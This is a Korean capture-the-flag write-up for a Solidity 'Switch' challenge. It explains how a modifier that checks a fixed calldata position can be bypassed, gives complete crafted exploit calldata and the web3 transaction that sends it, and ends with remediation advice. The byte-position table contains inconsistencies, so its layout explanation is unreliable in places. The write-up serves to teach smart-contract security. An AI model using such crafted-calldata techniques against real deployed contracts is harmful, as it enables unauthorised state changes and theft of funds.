Switch Challenge Writeup
문제 개요
목표: Switch 컨트랙트의 switchOn 변수를 true로 만들기
난이도: Medium-Hard
핵심 개념: ABI 인코딩, Calldata 조작, 동적 데이터 타입
컨트랙트 분석
주요 구성 요소
soliditycontract Switch {
    bool public switchOn; // 초기값: false
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));
    
    modifier onlyThis() {
        require(msg.sender == address(this), "Only the contract can call this");
        _;
    }
    
    modifier onlyOff() {
        bytes32[1] memory selector;
        assembly {
            calldatacopy(selector, 68, 4) // calldata 68번째 위치에서 4바이트 읽기
        }
        require(selector[0] == offSelector, "Can only call the turnOffSwitch function");
        _;
    }
    
    function flipSwitch(bytes memory _data) public onlyOff {
        (bool success,) = address(this).call(_data);
        require(success, "call failed :(");
    }
    
    function turnSwitchOn() public onlyThis {
        switchOn = true;
    }
    
    function turnSwitchOff() public onlyThis {
        switchOn = false;
    }
}
함수 분석

turnSwitchOn(): 스위치를 켜는 함수 (onlyThis 보호)
turnSwitchOff(): 스위치를 끄는 함수 (onlyThis 보호)
flipSwitch(): 임의의 데이터로 내부 호출을 수행 (onlyOff 보호)

보안 메커니즘

onlyThis 모디파이어: 컨트랙트 자신만 turnSwitchOn()/turnSwitchOff() 호출 가능
onlyOff 모디파이어: calldata의 68번째 위치에서 turnSwitchOff() 셀렉터를 확인

취약점 발견
핵심 취약점: ABI 인코딩 vs 고정 위치 검증
onlyOff 모디파이어의 치명적 결함:
solidityassembly {
    calldatacopy(selector, 68, 4) // 항상 68번째 위치만 확인
}
하지만 flipSwitch(bytes memory _data)에서 실제 사용되는 데이터는 동적 위치에 저장됩니다.
ABI 인코딩 구조 이해
flipSwitch(bytes memory _data) 호출 시 calldata 구조:
0-3:     함수 셀렉터 (flipSwitch)
4-35:    _data 파라미터의 오프셋
36-67:   (패딩)
68-71:   ← onlyOff가 체크하는 위치
...
offset:  실제 bytes 데이터 시작 위치
offset+32: 데이터 길이
offset+36: 실제 데이터 내용
익스플로잇 개발
공격 아이디어

68번째 위치: turnSwitchOff() 셀렉터 배치 → 모디파이어 우회
동적 위치: turnSwitchOn() 셀렉터 배치 → 실제 실행

함수 셀렉터 계산
javascriptconst turnSwitchOnSelector = web3.utils.keccak256("turnSwitchOn()").slice(0, 10);
// 결과: 0x76227e12

const turnSwitchOffSelector = web3.utils.keccak256("turnSwitchOff()").slice(0, 10);
// 결과: 0x20606e15

const flipSwitchSelector = web3.utils.keccak256("flipSwitch(bytes)").slice(0, 10);
// 결과: 0x30c13ade
악의적인 Calldata 구성
위치    | 데이터                                                           | 설명
--------|----------------------------------------------------------------|------------------
0-3     | 30c13ade                                                       | flipSwitch 셀렉터
4-35    | 0000000000000000000000000000000000000000000000000000000000000060 | 오프셋: 96
36-67   | 0000000000000000000000000000000000000000000000000000000000000000 | 패딩
68-71   | 20606e15                                                       | turnSwitchOff 셀렉터 (모디파이어용)
72-95   | 000000000000000000000000000000000000000000000000000000000000   | 패딩
96-127  | 0000000000000000000000000000000000000000000000000000000000000004 | 데이터 길이: 4
128-131 | 76227e12                                                       | turnSwitchOn 셀렉터
132-159 | 00000000000000000000000000000000000000000000000000000000       | 패딩
최종 Calldata
javascriptconst maliciousData = "0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";
공격 실행
1단계: 트랜잭션 전송
javascriptawait web3.eth.sendTransaction({
    from: player,
    to: contract.address, 
    data: maliciousData,
    gas: 200000
});
2단계: 결과 확인
javascriptconst result = await contract.switchOn();
console.log(result); // true
공격 성공 원리
실행 흐름

flipSwitch() 호출: 악의적인 calldata로 함수 호출
onlyOff 모디파이어: 68번째 위치에서 turnSwitchOff() 셀렉터 발견 → 통과
address(this).call(_data): 96번째 위치부터 시작하는 turnSwitchOn() 셀렉터 실행
turnSwitchOn() 실행: msg.sender == address(this) 조건 만족 (internal call) → 스위치 ON

핵심 포인트

이중 데이터 배치: 같은 calldata에 두 개의 서로 다른 함수 셀렉터 배치
오프셋 조작: ABI 인코딩의 동적 특성을 이용하여 실제 실행 데이터 위치 조작
모디파이어 우회: 고정 위치 검증의 한계를 악용

교훈 및 보안 권고사항
취약점의 근본 원인

고정 위치 의존성: 동적 데이터에 대해 고정 위치를 검증하는 것은 위험
불완전한 입력 검증: calldata 전체가 아닌 일부만 검증
ABI 인코딩 복잡성: 개발자가 ABI 인코딩의 세부사항을 완전히 이해하지 못함

보안 개선 방안

전체 calldata 해시: 허용된 calldata의 해시값을 미리 저장하고 비교
화이트리스트 접근: 허용된 함수 셀렉터만 미리 정의
동적 검증: calldata를 파싱하여 실제 함수 셀렉터 추출 후 검증

solidity// 개선된 버전 예시
modifier onlyOffImproved(bytes memory _data) {
    bytes4 selector;
    assembly {
        selector := mload(add(_data, 0x20))
    }
    require(selector == offSelector, "Invalid function");
    _;
}
결론
이 문제는 Solidity의 ABI 인코딩 메커니즘과 calldata 구조에 대한 깊은 이해를 요구하는 고난도 문제였습니다.
핵심 학습 포인트:

ABI 인코딩에서 동적 데이터의 처리 방식
고정 위치 검증의 한계
스마트 컨트랙트 보안에서 입력 검증의 중요성

성공적인 해결을 통해 Ethereum 스마트 컨트랙트의 저수준 동작 원리와 보안 취약점에 대한 이해를 크게 향상시킬 수 있었습니다.
